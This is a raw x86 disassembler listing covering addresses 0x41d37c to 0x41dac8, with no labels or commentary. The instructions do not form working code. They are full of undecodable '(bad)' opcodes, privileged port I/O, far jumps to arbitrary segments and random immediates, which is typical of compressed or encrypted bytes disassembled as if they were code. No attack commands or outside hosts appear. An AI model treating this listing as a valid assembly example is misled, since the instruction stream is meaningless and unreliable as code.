  41d37c:	push   esi
  41d37d:	adc    BYTE PTR [edx],dh
  41d37f:	push   esp
  41d380:	jb     0x41d3a5
  41d382:	mov    BYTE PTR [eax+ebp*8],bh
  41d385:	xchg   ebx,ebx
  41d387:	cmp    al,0x2c
  41d389:	or     BYTE PTR [ecx-0x49d1b066],ch
  41d38f:	fidiv  DWORD PTR [eax+0x4f]
  41d392:	mov    edi,0x1bc8aba2
  41d397:	cdq    
  41d398:	in     al,0xac
  41d39a:	jle    0x41d337
  41d39c:	popa   
  41d39d:	add    eax,0x1c5adb92
  41d3a2:	stos   BYTE PTR es:[edi],al
  41d3a3:	cmp    cl,BYTE PTR [ecx+0x49]
  41d3a6:	in     eax,dx
  41d3a7:	rcr    bh,0x3e
  41d3aa:	es xchg ebx,eax
  41d3ac:	out    0x92,al
  41d3ae:	pop    ss
  41d3af:	jp     0x41d3c6
  41d3b1:	mov    ebx,DWORD PTR [edx+0xa21e924]
  41d3b7:	sahf   
  41d3b8:	retf   
  41d3b9:	jg     0x41d357
  41d3bb:	test   al,0x5e
  41d3bd:	push   ebp
  41d3be:	mov    DWORD PTR [edi+0x172e8104],edi
  41d3c4:	fwait
  41d3c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3c6:	out    0x4c,eax
  41d3c8:	sti    
  41d3c9:	inc    esi
  41d3ca:	inc    ecx
  41d3cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3cc:	les    ebp,FWORD PTR [esp+ebx*1-0x4c1a2392]
  41d3d3:	sbb    eax,0xbb754e78
  41d3d8:	int3   
  41d3d9:	pop    ecx
  41d3da:	dec    edi
  41d3db:	inc    ebp
  41d3dc:	stos   DWORD PTR es:[edi],eax
  41d3dd:	or     DWORD PTR [esi],esi
  41d3df:	push   0xffffffd8
  41d3e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3e2:	add    edx,0xffffffaf
  41d3e5:	and    cl,dh
  41d3e7:	mov    dl,0x1c
  41d3e9:	adc    ch,BYTE PTR ss:[ecx]
  41d3ec:	xchg   esp,eax
  41d3ed:	push   esp
  41d3ee:	clc    
  41d3ef:	into   
  41d3f0:	dec    eax
  41d3f1:	je     0x41d37e
  41d3f3:	and    edi,DWORD PTR [ecx+0x4143b5a6]
  41d3f9:	xlat   BYTE PTR ds:[ebx]
  41d3fa:	fs fwait
  41d3fc:	and    edi,DWORD PTR [ecx-0x1166d4fe]
  41d402:	xchg   ebx,eax
  41d403:	jmp    0x9c34:0xf7904ba4
  41d40a:	xor    eax,0x612acc33
  41d40f:	mov    eax,ds:0x3d35f103
  41d414:	nop
  41d415:	int    0xff
  41d417:	aaa    
  41d418:	cmp    eax,0xbdf09a9a
  41d41d:	aam    0x49
  41d41f:	(bad)  
  41d421:	es push ds
  41d423:	jge    0x41d491
  41d425:	cwde   
  41d426:	jnp    0x41d413
  41d428:	cmp    eax,0x6f069fb7
  41d42d:	iret   
  41d42e:	pop    ss
  41d42f:	xchg   ebp,eax
  41d430:	xchg   BYTE PTR [edx],bl
  41d432:	clc    
  41d433:	jns    0x41d447
  41d435:	cmp    eax,0x1d962e66
  41d43a:	jmp    0x9163:0x7ef49186
  41d441:	xchg   ebp,eax
  41d442:	add    ebx,edx
  41d444:	mov    bh,0x94
  41d446:	data16 mov ah,0x6b
  41d449:	fcom   QWORD PTR [ecx-0x12]
  41d44c:	ins    DWORD PTR es:[edi],dx
  41d44d:	mov    al,ds:0xd8b31628
  41d452:	jo     0x41d4b8
  41d454:	inc    ebx
  41d455:	dec    esp
  41d456:	pushf  
  41d457:	mov    edi,0xda9a1e4c
  41d45c:	mov    dh,0xf
  41d45e:	imul   BYTE PTR [ecx-0x62]
  41d461:	out    dx,al
  41d462:	xchg   esp,eax
  41d463:	xor    al,dh
  41d465:	add    al,dh
  41d467:	shr    DWORD PTR [eax],cl
  41d469:	jmp    0x41d4b4
  41d46b:	sbb    dh,ch
  41d46d:	retf   0xd541
  41d470:	and    al,0xea
  41d472:	inc    ebx
  41d473:	sbb    esi,ecx
  41d475:	icebp  
  41d476:	xor    al,0xaf
  41d478:	enter  0xca1d,0xbf
  41d47c:	fwait
  41d47d:	rcl    DWORD PTR [ecx-0x4cf40b51],cl
  41d483:	dec    ebp
  41d484:	imul   ecx,DWORD PTR [esi+0x50],0x478cfe29
  41d48b:	mov    ecx,0x97786229
  41d490:	scas   al,BYTE PTR es:[edi]
  41d491:	xor    al,0xd6
  41d493:	aaa    
  41d494:	push   0x26be01e9
  41d499:	fwait
  41d49a:	loope  0x41d49b
  41d49c:	push   cs
  41d49d:	pop    ecx
  41d49e:	cwde   
  41d49f:	adc    bl,BYTE PTR [eiz*4-0x78148a7c]
  41d4a6:	mov    WORD PTR [ebx+0x56ffc1ef],ss
  41d4ac:	inc    esp
  41d4ad:	mov    db5,ebx
  41d4b0:	cwde   
  41d4b1:	mov    WORD PTR [eax-0x4b],gs
  41d4b4:	(bad)
  41d4b7:	dec    edi
  41d4b8:	in     eax,dx
  41d4b9:	(bad)  
  41d4bb:	sbb    BYTE PTR ds:0x7b89dac7,0x3a
  41d4c2:	daa    
  41d4c3:	xchg   edx,eax
  41d4c4:	or     ebp,DWORD PTR [edx]
  41d4c6:	sub    eax,eax
  41d4c8:	cld    
  41d4c9:	jmp    0x68d3:0x8dfbd703
  41d4d0:	ret    0x309c
  41d4d3:	test   al,0x86
  41d4d5:	imul   ecx,DWORD PTR [edi+ecx*4-0x4bb5e60c],0xb06ff582
  41d4e0:	cmp    eax,esi
  41d4e2:	add    al,0x55
  41d4e4:	ins    DWORD PTR es:[edi],dx
  41d4e5:	in     al,dx
  41d4e6:	ins    DWORD PTR es:[edi],dx
  41d4e7:	pop    ebx
  41d4e8:	cs call 0x5289:0x1b3445a2
  41d4f0:	and    bl,BYTE PTR fs:[ebp-0x7b]
  41d4f4:	inc    edx
  41d4f5:	shl    BYTE PTR [eax+0x15758d47],cl
  41d4fb:	cmp    ebx,0x7
  41d4fe:	add    ebp,esi
  41d500:	fmul   st,st(4)
  41d502:	jb     0x41d494
  41d504:	jge    0x41d506
  41d506:	jbe    0x41d534
  41d508:	aas    
  41d509:	mov    ds:0x4f775592,al
  41d50e:	xor    edx,edi
  41d510:	je     0x41d50c
  41d512:	and    ah,BYTE PTR [esi+0x110a5610]
  41d518:	cld    
  41d519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d51a:	or     BYTE PTR [edi+0x1894abab],ah
  41d520:	dec    edx
  41d521:	add    al,0x86
  41d523:	rol    DWORD PTR [eax-0x2],0x78
  41d527:	adc    ecx,DWORD PTR [eax+0x745faf84]
  41d52d:	and    al,0x94
  41d52f:	push   ebp
  41d530:	enter  0xecc4,0xc7
  41d534:	(bad)  
  41d535:	pusha  
  41d536:	xor    bl,dh
  41d538:	ror    DWORD PTR [eax+0x4e0323ee],0x58
  41d53f:	adc    eax,0x2d0d244b
  41d544:	xchg   ecx,eax
  41d545:	outs   dx,DWORD PTR ds:[esi]
  41d546:	sbb    DWORD PTR [edi+0x3b9b7250],ecx
  41d54c:	int    0x65
  41d54e:	shl    DWORD PTR [ebx+0x56],0x4d
  41d552:	call   0xd5ee96ed
  41d557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d558:	ins    BYTE PTR es:[edi],dx
  41d559:	mov    edi,0xb03b1a2f
  41d55e:	dec    bh
  41d560:	mov    esp,0xf0fff2c4
  41d565:	ds retf 
  41d567:	into   
  41d568:	push   ebx
  41d569:	pop    es
  41d56a:	iret   
  41d56b:	outs   dx,BYTE PTR es:[esi]
  41d56d:	mov    edx,DWORD PTR [edi-0x35]
  41d570:	inc    edi
  41d571:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d572:	imul   dh
  41d574:	mov    ebp,0x3394a2b4
  41d579:	or     al,0x23
  41d57b:	xor    al,0xa
  41d57d:	fwait
  41d57e:	inc    BYTE PTR [esi+0x36]
  41d581:	loop   0x41d5fd
  41d583:	cdq    
  41d584:	mov    ecx,0x1e4c6262
  41d589:	rcr    BYTE PTR [ebx+0x5db269a4],0x5c
  41d590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d591:	test   ebp,ecx
  41d593:	call   0xd0ca:0x1c928197
  41d59a:	or     eax,0x19e05fbd
  41d59f:	sti    
  41d5a0:	cmp    esi,DWORD PTR [edi]
  41d5a2:	popf   
  41d5a3:	sar    DWORD PTR [ecx-0x7a],0x5c
  41d5a7:	adc    eax,0x5b3314a0
  41d5ac:	ror    DWORD PTR [eax],0xd
  41d5af:	mov    dh,0x30
  41d5b1:	fisubr DWORD PTR [ebp+ecx*2+0x4baa72f3]
  41d5b8:	xchg   ebx,eax
  41d5b9:	leave  
  41d5ba:	xor    BYTE PTR [edi-0x5069fad5],ah
  41d5c0:	out    0x87,eax
  41d5c2:	cdq    
  41d5c3:	sbb    al,0x9b
  41d5c5:	mov    edi,0x8ba071b2
  41d5ca:	pop    esp
  41d5cb:	ss int 0x96
  41d5ce:	repnz in al,dx
  41d5d0:	addr16 push ebp
  41d5d2:	dec    edx
  41d5d3:	push   es
  41d5d4:	cmp    dl,BYTE PTR [esi+edx*2]
  41d5d7:	mov    DWORD PTR ds:0x970d9384,ebx
  41d5dd:	stos   DWORD PTR es:[edi],eax
  41d5de:	push   ecx
  41d5df:	mov    al,0xae
  41d5e1:	xchg   edi,eax
  41d5e2:	fdivr  DWORD PTR [ebx]
  41d5e4:	and    BYTE PTR [esi+0x33],dh
  41d5e7:	xchg   ebx,eax
  41d5e8:	rol    ebx,0xc2
  41d5eb:	push   edi
  41d5ec:	push   ss
  41d5ed:	push   ds
  41d5ee:	xchg   ebp,eax
  41d5ef:	cwde   
  41d5f0:	imul   ecx,ebp,0x4c
  41d5f3:	fsubr  st(2),st
  41d5f5:	ret    0xcc85
  41d5f8:	into   
  41d5f9:	jge    0x41d606
  41d5fb:	cmp    DWORD PTR [esi-0x80],ebp
  41d5fe:	jg     0x41d5ef
  41d600:	fdiv   QWORD PTR [ebp+0x4578ddad]
  41d606:	cdq    
  41d607:	jecxz  0x41d5c2
  41d609:	pop    esi
  41d60a:	add    eax,0x23b40095
  41d60f:	dec    esi
  41d610:	mov    al,ds:0x4418c8fb
  41d615:	push   ebx
  41d616:	(bad)  
  41d617:	and    dl,ch
  41d619:	fdiv   st,st(7)
  41d61b:	inc    ebp
  41d61c:	mov    ch,0x3e
  41d61e:	imul   ah
  41d620:	ins    DWORD PTR es:[edi],dx
  41d621:	loop   0x41d635
  41d623:	or     DWORD PTR [ecx+edi*1+0x73719181],edi
  41d62a:	in     eax,0xdc
  41d62c:	mov    dh,0xb4
  41d62e:	inc    esp
  41d62f:	dec    esp
  41d630:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d631:	rol    DWORD PTR [eax+0x34],0x6a
  41d635:	mov    edx,0x1f5c4f70
  41d63a:	mov    eax,0x612f8d97
  41d63f:	xchg   ebp,edx
  41d641:	cmp    ch,BYTE PTR [esi]
  41d643:	and    eax,0xb306dfbd
  41d648:	imul   edi,DWORD PTR [ebx+0x39],0x4fc943ff
  41d64f:	adc    ch,BYTE PTR [edi-0x6a02b8fd]
  41d655:	and    ecx,ecx
  41d657:	scas   al,BYTE PTR es:[edi]
  41d658:	mov    cl,0xa6
  41d65a:	fld    TBYTE PTR [ebx-0x64]
  41d65d:	enter  0x90e3,0xb0
  41d661:	sub    al,0x2c
  41d663:	clc    
  41d664:	mov    al,ds:0xbb4c1bed
  41d669:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d66b:	sub    ch,BYTE PTR [eax+0x74]
  41d66e:	add    al,0x9d
  41d670:	sti    
  41d671:	leave  
  41d672:	stos   DWORD PTR es:[edi],eax
  41d673:	cmp    al,0x78
  41d675:	mov    esp,0x330e3d82
  41d67a:	ret    
  41d67b:	mov    gs:0x7ea549ac,al
  41d681:	mov    BYTE PTR [esi-0x11],dl
  41d684:	fwait
  41d685:	cwde   
  41d686:	push   edx
  41d687:	repz sub DWORD PTR [edx-0x5f],0x16
  41d68c:	add    DWORD PTR [edi-0x7d],esi
  41d68f:	sahf   
  41d690:	loope  0x41d6f1
  41d692:	stos   DWORD PTR es:[edi],eax
  41d693:	cdq    
  41d694:	and    BYTE PTR [eax],bh
  41d696:	or     ebx,ecx
  41d698:	adc    al,0x35
  41d69a:	or     al,0x90
  41d69c:	idiv   dl
  41d69e:	adc    al,0x94
  41d6a0:	sub    eax,0xf5455ab0
  41d6a5:	push   0xf644ddce
  41d6aa:	sub    BYTE PTR [ebx+0x78],bl
  41d6ad:	sub    eax,0xfde84dc5
  41d6b2:	dec    eax
  41d6b3:	sbb    DWORD PTR [esp+ebp*8-0x53bdf4fe],eax
  41d6ba:	adc    bh,dh
  41d6bc:	fst    DWORD PTR [eax-0x16]
  41d6bf:	mov    esi,cs
  41d6c1:	add    eax,ebp
  41d6c3:	cdq    
  41d6c4:	inc    ebp
  41d6c5:	pop    esp
  41d6c6:	adc    bh,BYTE PTR [edi-0x1a]
  41d6c9:	aad    0x88
  41d6cb:	outs   dx,BYTE PTR ds:[esi]
  41d6cc:	into   
  41d6cd:	jmp    0xe2e3:0xc9b2b9c3
  41d6d4:	daa    
  41d6d5:	cmp    ch,BYTE PTR [esi]
  41d6d7:	mov    eax,0x25da324a
  41d6dc:	sub    al,0xf7
  41d6de:	pop    edi
  41d6df:	sbb    esi,eax
  41d6e1:	adc    eax,esp
  41d6e3:	push   ds
  41d6e4:	sub    al,0xc9
  41d6e6:	repz add al,0xca
  41d6e9:	adc    BYTE PTR [eax-0x28880d45],0x6c
  41d6f0:	add    bl,dl
  41d6f2:	jne    0x41d759
  41d6f4:	cld    
  41d6f5:	dec    ecx
  41d6f6:	cli    
  41d6f7:	add    bl,BYTE PTR [esi-0x3d8e860d]
  41d6fd:	retf   
  41d6fe:	and    DWORD PTR [eax-0x27],esp
  41d701:	ret    0xafef
  41d704:	fs xchg edx,eax
  41d706:	lock xchg edi,eax
  41d708:	into   
  41d709:	dec    esi
  41d70a:	pop    ss
  41d70b:	xchg   ebp,eax
  41d70c:	or     al,0x1f
  41d70e:	sub    DWORD PTR [esp+eiz*2-0x3b161623],ecx
  41d715:	clc    
  41d716:	or     ebx,edi
  41d718:	cmp    BYTE PTR [eax+edx*4+0x538d8cc5],ch
  41d71f:	and    BYTE PTR [edi-0x14],dh
  41d722:	push   ebp
  41d723:	ds scas eax,DWORD PTR es:[edi]
  41d725:	pop    es
  41d726:	lock movaps xmm3,XMMWORD PTR [esi+0x10]
  41d72b:	enter  0x1418,0x50
  41d72f:	cmp    BYTE PTR ds:0x4516418f,dh
  41d735:	mov    al,0x9d
  41d737:	dec    ecx
  41d738:	outs   dx,DWORD PTR ds:[esi]
  41d739:	es mov bl,0x1b
  41d73c:	shl    DWORD PTR [edi-0x1c9033a7],0x9c
  41d743:	pop    edx
  41d744:	mov    edx,0xfe8f8217
  41d749:	daa    
  41d74a:	fidiv  WORD PTR [edi+edx*2]
  41d74d:	hlt    
  41d74e:	sub    ch,BYTE PTR [edx]
  41d750:	sbb    al,0x40
  41d752:	fnstcw WORD PTR ds:0xbcdb187e
  41d758:	adc    eax,0xb16ee9d4
  41d75d:	dec    ebp
  41d75e:	inc    eax
  41d75f:	(bad)  
  41d760:	fild   DWORD PTR [esi-0x61030a0]
  41d766:	fadd   st,st(5)
  41d768:	sar    BYTE PTR [esi],cl
  41d76a:	sbb    esi,esp
  41d76c:	mov    ebp,0xda4882c1
  41d771:	rol    eax,1
  41d773:	imul   esi,DWORD PTR [eax-0x47372122],0x1c27b467
  41d77d:	mov    dh,0xe0
  41d77f:	sahf   
  41d780:	pop    edi
  41d781:	xor    BYTE PTR [eax-0x4ca07d79],bl
  41d787:	retf   
  41d788:	jb     0x41d784
  41d78a:	xchg   esp,eax
  41d78b:	cmp    eax,0x728da653
  41d790:	mov    ecx,0x4aaa63c8
  41d795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d796:	in     al,0x87
  41d798:	leave  
  41d799:	ins    BYTE PTR es:[edi],dx
  41d79a:	jecxz  0x41d7de
  41d79c:	(bad)  
  41d79d:	fadd   DWORD PTR [esi-0x15b70c7a]
  41d7a3:	and    eax,0xb2ded6c1
  41d7a8:	repz sub al,BYTE PTR [edi+0xa]
  41d7ac:	jge    0x41d7b8
  41d7ae:	jle    0x41d752
  41d7b0:	dec    edx
  41d7b1:	xor    al,0x8
  41d7b3:	jle    0x41d792
  41d7b5:	sub    al,0xb8
  41d7b7:	mov    esp,0xca451a9d
  41d7bc:	js     0x41d762
  41d7be:	shr    ecx,0xac
  41d7c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7c2:	repz xor al,0x59
  41d7c5:	sub    eax,0x3bbe7be8
  41d7ca:	imul   ebx,DWORD PTR [edi],0xffffffa1
  41d7cd:	sub    eax,0xa96bcf79
  41d7d2:	mov    ah,0x2d
  41d7d4:	fstp   TBYTE PTR [ecx+0x3e]
  41d7d7:	js     0x41d821
  41d7d9:	cmp    cl,BYTE PTR [edi-0x6e]
  41d7dc:	hlt    
  41d7dd:	sub    dh,dl
  41d7df:	out    dx,al
  41d7e0:	rcl    DWORD PTR [esi+0x39c7eba5],cl
  41d7e6:	mov    ch,0x70
  41d7e8:	jmp    0x41d851
  41d7ea:	(bad)  
  41d7eb:	addr16 mov ds:0x2642,al
  41d7ef:	scas   al,BYTE PTR es:[edi]
  41d7f0:	lods   al,BYTE PTR ds:[esi]
  41d7f1:	aaa    
  41d7f2:	xor    eax,0x2970099
  41d7f7:	or     eax,0x4740c6f1
  41d7fc:	adc    BYTE PTR [esi+0x47a57b55],dl
  41d802:	js     0x41d82b
  41d804:	rol    BYTE PTR [ebx-0x6f],1
  41d807:	mov    BYTE PTR [ecx+esi*4+0x19f8715b],bl
  41d80e:	xchg   edx,eax
  41d80f:	sub    esi,DWORD PTR [ebp-0x3bc3354d]
  41d815:	xchg   edx,eax
  41d816:	adc    BYTE PTR [edx+0x5d],bl
  41d819:	xchg   esp,eax
  41d81a:	or     eax,0x70764075
  41d81f:	hlt    
  41d820:	mov    BYTE PTR [edx+edi*8+0x7b],0xb7
  41d825:	cli    
  41d826:	jns    0x41d80c
  41d828:	cli    
  41d829:	mov    DWORD PTR es:[ebx+0x45],ebp
  41d82d:	cmp    al,0x8b
  41d82f:	das    
  41d830:	cdq    
  41d831:	repnz fwait
  41d833:	adc    DWORD PTR [ecx+eiz*4-0x4d3c921e],edi
  41d83a:	or     DWORD PTR [ebx+ecx*1],esi
  41d83d:	stos   BYTE PTR es:[edi],al
  41d83e:	inc    edx
  41d83f:	jb     0x41d8a3
  41d841:	and    al,0x63
  41d843:	jmp    0x6a93:0x4ac65ce
  41d84a:	clc    
  41d84b:	js     0x41d872
  41d84d:	retf   0xfcb2
  41d850:	nop
  41d851:	jb     0x41d891
  41d853:	rcl    dh,1
  41d855:	ret    
  41d856:	icebp  
  41d857:	xchg   BYTE PTR [eax+0x25b9851c],bh
  41d85d:	push   edx
  41d85e:	sbb    al,0x15
  41d860:	repz push es
  41d862:	push   0x3a
  41d864:	dec    ebp
  41d865:	in     eax,0x45
  41d867:	inc    eax
  41d868:	aam    0xb1
  41d86a:	and    ebp,ebx
  41d86c:	jecxz  0x41d890
  41d86e:	jp     0x41d885
  41d870:	or     DWORD PTR ds:0xc8a30a61,ecx
  41d876:	aad    0x2f
  41d878:	fsubr  QWORD PTR ds:0x54a38566
  41d87e:	xlat   BYTE PTR ds:[ebx]
  41d87f:	fcom   DWORD PTR [edi+0x57]
  41d882:	mov    eax,0xe5d59b56
  41d887:	paddusw mm5,mm4
  41d88a:	ss stos BYTE PTR es:[edi],al
  41d88c:	dec    ebp
  41d88d:	test   DWORD PTR [ebx-0x19],esi
  41d890:	cmp    al,0x79
  41d892:	retf   0x6880
  41d895:	lds    ebx,FWORD PTR [eax]
  41d897:	sar    edi,1
  41d899:	pop    ds
  41d89a:	push   esp
  41d89b:	jle    0x41d872
  41d89d:	je     0x41d8b0
  41d89f:	cmc    
  41d8a0:	outs   dx,BYTE PTR ds:[esi]
  41d8a1:	jae    0x41d84d
  41d8a3:	sbb    eax,0x85533e1c
  41d8a8:	cld    
  41d8a9:	sbb    DWORD PTR [edi+0x2a7ffdc2],ebp
  41d8af:	std    
  41d8b0:	loop   0x41d92b
  41d8b2:	cmp    cl,al
  41d8b4:	and    ebp,DWORD PTR [ecx+0x54bbc5e7]
  41d8ba:	shr    BYTE PTR ds:0x384d32b3,1
  41d8c0:	enter  0x9f03,0x80
  41d8c4:	dec    edi
  41d8c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8c6:	jle    0x41d92e
  41d8c8:	cmp    ebp,DWORD PTR [ecx]
  41d8ca:	xchg   ecx,eax
  41d8cb:	xchg   esi,eax
  41d8cc:	dec    eax
  41d8cd:	jae    0x41d886
  41d8cf:	lds    edi,FWORD PTR [esp+eiz*2]
  41d8d2:	sar    DWORD PTR [esi+ebp*1],1
  41d8d5:	cmp    al,0x98
  41d8d7:	push   ecx
  41d8d8:	add    ecx,DWORD PTR [eax+0x76907369]
  41d8de:	cmp    bl,BYTE PTR [ebx+0x5b]
  41d8e1:	cmp    DWORD PTR [eax+0x6f8bc9a0],edi
  41d8e7:	(bad)  
  41d8e8:	cli    
  41d8e9:	sbb    al,0x6f
  41d8eb:	cmp    eax,0xaa11c471
  41d8f0:	fidiv  WORD PTR [edx+eax*4]
  41d8f3:	les    esp,FWORD PTR [eax+ebx*2+0x4e23f2b3]
  41d8fa:	cdq    
  41d8fb:	add    edx,DWORD PTR [ebx+0x42]
  41d8fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8ff:	jg     0x41d8a4
  41d901:	out    dx,al
  41d902:	xor    DWORD PTR [ebp-0x4d969f93],ebx
  41d908:	daa    
  41d909:	(bad)  
  41d90a:	adc    al,0xdb
  41d90c:	mov    ecx,DWORD PTR [ebp+0x1a]
  41d90f:	pop    ecx
  41d910:	cmp    eax,DWORD PTR [edx]
  41d912:	push   ecx
  41d913:	loopne 0x41d8a4
  41d915:	repnz test BYTE PTR [eax],cl
  41d918:	lahf   
  41d919:	pop    edx
  41d91a:	lock or al,BYTE PTR [edi-0x74]
  41d91e:	jge    0x41d91a
  41d920:	fldenv [ebx]
  41d922:	add    al,0xd9
  41d924:	in     al,0x7b
  41d926:	jl     0x41d8b4
  41d928:	lods   eax,DWORD PTR ds:[esi]
  41d929:	mov    eax,0xd4fc70a6
  41d92e:	jl     0x41d8b5
  41d930:	daa    
  41d931:	xchg   ebx,eax
  41d932:	dec    esi
  41d933:	xchg   DWORD PTR [edi+0x60],edi
  41d936:	scas   eax,DWORD PTR es:[edi]
  41d937:	retf   0x41d
  41d93a:	mov    bl,0x29
  41d93c:	pop    ss
  41d93d:	inc    ebp
  41d93e:	test   al,0x3
  41d940:	or     DWORD PTR [ebx-0x7d],eax
  41d943:	sbb    BYTE PTR [ecx],ah
  41d945:	mov    DWORD PTR [eax-0x3c2eb879],ebx
  41d94b:	retf   0x7418
  41d94e:	push   edx
  41d94f:	fimul  DWORD PTR [ebp+0x60]
  41d952:	dec    eax
  41d953:	and    al,0xf2
  41d955:	mov    ecx,0x1227d6a8
  41d95a:	popf   
  41d95b:	loope  0x41d98d
  41d95d:	mov    bl,0x36
  41d95f:	add    eax,0x22e11530
  41d964:	push   esp
  41d965:	xor    BYTE PTR [ebx+eiz*8],al
  41d968:	and    dh,ch
  41d96a:	pop    edi
  41d96b:	push   0xfffffff6
  41d96d:	nop
  41d96e:	pop    edi
  41d96f:	gs icebp 
  41d971:	dec    esi
  41d972:	out    dx,eax
  41d973:	sub    DWORD PTR [ecx],edi
  41d975:	adc    al,0x61
  41d977:	cdq    
  41d978:	dec    edx
  41d979:	push   ds
  41d97a:	int3   
  41d97b:	scas   al,BYTE PTR es:[edi]
  41d97c:	lock shl BYTE PTR [ecx],1
  41d97f:	fcomi  st,st(5)
  41d981:	lods   al,BYTE PTR ds:[esi]
  41d982:	push   cs
  41d983:	mov    ds:0x8a53f88f,al
  41d988:	dec    ebp
  41d989:	gs stc 
  41d98b:	push   eax
  41d98c:	out    dx,eax
  41d98d:	cwde   
  41d98e:	mov    ebx,0x71e20c04
  41d993:	test   BYTE PTR [ebx+ebx*2-0x6f],bh
  41d997:	xor    BYTE PTR [edi+0x7130daf0],dl
  41d99d:	sbb    edi,esi
  41d99f:	popa   
  41d9a0:	mov    ds:0x67dbf424,al
  41d9a5:	js     0x41d9b5
  41d9a7:	add    bh,BYTE PTR [esi+0x3de83748]
  41d9ad:	sahf   
  41d9ae:	pop    eax
  41d9af:	xchg   edi,eax
  41d9b0:	mov    esi,edx
  41d9b2:	fild   QWORD PTR [edx]
  41d9b4:	adc    dh,al
  41d9b6:	mov    ch,0xe2
  41d9b8:	cmp    DWORD PTR [esi-0x7a],esi
  41d9bb:	call   0x400e:0x41acd0ca
  41d9c2:	shr    BYTE PTR [edx+0x650404f6],1
  41d9c8:	dec    esp
  41d9c9:	add    dh,ch
  41d9cb:	test   DWORD PTR [ecx+0x70],esi
  41d9ce:	ja     0x41d96e
  41d9d0:	cld    
  41d9d1:	jne    0x41d9e6
  41d9d3:	jne    0x41d9fa
  41d9d5:	xchg   ebx,eax
  41d9d6:	sub    DWORD PTR [ecx+0x34],ebp
  41d9d9:	dec    eax
  41d9da:	inc    ebp
  41d9db:	(bad)  
  41d9dc:	stos   BYTE PTR es:[edi],al
  41d9dd:	cld    
  41d9de:	sbb    al,0xe5
  41d9e0:	cld    
  41d9e1:	add    DWORD PTR [edi+0x5b],ecx
  41d9e4:	add    bh,BYTE PTR [ebx+0x5ea069a2]
  41d9ea:	pushf  
  41d9eb:	xor    DWORD PTR [ebp-0x6e],ecx
  41d9ee:	test   al,0x8c
  41d9f0:	xchg   esi,eax
  41d9f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9f2:	daa    
  41d9f3:	jns    0x41d98e
  41d9f5:	out    dx,al
  41d9f6:	or     eax,DWORD PTR [ebp+0x29]
  41d9f9:	xor    ecx,DWORD PTR [esi+0x4ea5d5b0]
  41d9ff:	inc    ebp
  41da00:	(bad)  
  41da01:	js     0x41da66
  41da03:	(bad)  
  41da04:	cmp    al,0xa2
  41da06:	sub    al,0xe8
  41da08:	nop
  41da09:	mov    ebx,0xe7620103
  41da0e:	rcr    bl,0x4c
  41da11:	fist   DWORD PTR [esi]
  41da13:	fwait
  41da14:	sub    BYTE PTR [ecx+0x21401d61],cl
  41da1a:	jp     0x41d99c
  41da1c:	lock lds edx,FWORD PTR [esi-0x66]
  41da20:	test   al,0xb4
  41da22:	pushf  
  41da23:	icebp  
  41da24:	inc    edi
  41da25:	mov    al,0xe1
  41da27:	sub    eax,0x3879a621
  41da2c:	cmp    BYTE PTR [ebx+0x37],dl
  41da2f:	sti    
  41da30:	mov    al,0x49
  41da32:	popa   
  41da33:	lea    ebp,[eax+ebx*4+0x278d2fa0]
  41da3a:	mov    edi,DWORD PTR [edi-0x5b]
  41da3d:	adc    DWORD PTR [esi-0x5ca06d1f],eax
  41da43:	adc    al,0xaa
  41da45:	test   al,0xc3
  41da47:	xor    ah,BYTE PTR [eax+0x7b]
  41da4a:	cmp    esp,DWORD PTR [eax+ebp*4]
  41da4d:	daa    
  41da4e:	or     bl,BYTE PTR [ebx+0x50]
  41da51:	cmp    al,0xc9
  41da53:	ret    0xa2b1
  41da56:	mov    dh,0xec
  41da58:	ins    BYTE PTR es:[edi],dx
  41da59:	xlat   BYTE PTR ds:[ebx]
  41da5a:	scas   eax,DWORD PTR es:[edi]
  41da5b:	lods   al,BYTE PTR ds:[esi]
  41da5c:	mov    ds:0xad62ed8e,al
  41da61:	loope  0x41d9f3
  41da63:	add    edi,ebp
  41da65:	or     edx,eax
  41da67:	sar    DWORD PTR [esi-0x230ee1a7],1
  41da6d:	adc    BYTE PTR [edi+0x65],dh
  41da70:	test   al,0x3e
  41da72:	ins    DWORD PTR es:[edi],dx
  41da73:	mov    ah,0xf3
  41da75:	bound  ecx,QWORD PTR [esi+eiz*2-0x1dcc6e3]
  41da7c:	cmp    esi,DWORD PTR [ebx-0x2b]
  41da7f:	lods   eax,DWORD PTR ds:[esi]
  41da80:	push   ss
  41da81:	dec    edx
  41da82:	inc    edi
  41da83:	cmp    al,0x2d
  41da85:	sbb    al,0xda
  41da87:	outs   dx,DWORD PTR ds:[esi]
  41da88:	and    BYTE PTR [eax+0x3c7a20bd],cl
  41da8e:	xchg   edi,eax
  41da8f:	xchg   ebx,eax
  41da90:	dec    edx
  41da91:	(bad)  
  41da92:	pop    ebx
  41da93:	enter  0xd4d3,0x7
  41da97:	dec    ebp
  41da98:	dec    edi
  41da99:	xor    BYTE PTR [edx],bh
  41da9b:	push   eax
  41da9c:	mov    cs,WORD PTR [eax+0x5a608bad]
  41daa2:	repz cmp bh,ah
  41daa5:	scas   al,BYTE PTR es:[edi]
  41daa6:	or     al,0x18
  41daa8:	cld    
  41daa9:	dec    edi
  41daaa:	sub    esp,0xffffffc5
  41daad:	adc    bh,bh
  41daaf:	lods   al,BYTE PTR ds:[esi]
  41dab0:	add    al,BYTE PTR [ebx-0x7c]
  41dab3:	inc    edx
  41dab4:	add    ebx,DWORD PTR ds:0x3b4dedff
  41daba:	iret   
  41dabb:	or     al,0xa9
  41dabd:	shl    ah,0x59
  41dac0:	pushf  
  41dac1:	inc    ebx
  41dac2:	icebp  
  41dac3:	sub    ch,bh
  41dac5:	pop    ebp
  41dac6:	dec    ebp
  41dac7:	std    
  41dac8:	ret    0x9f65
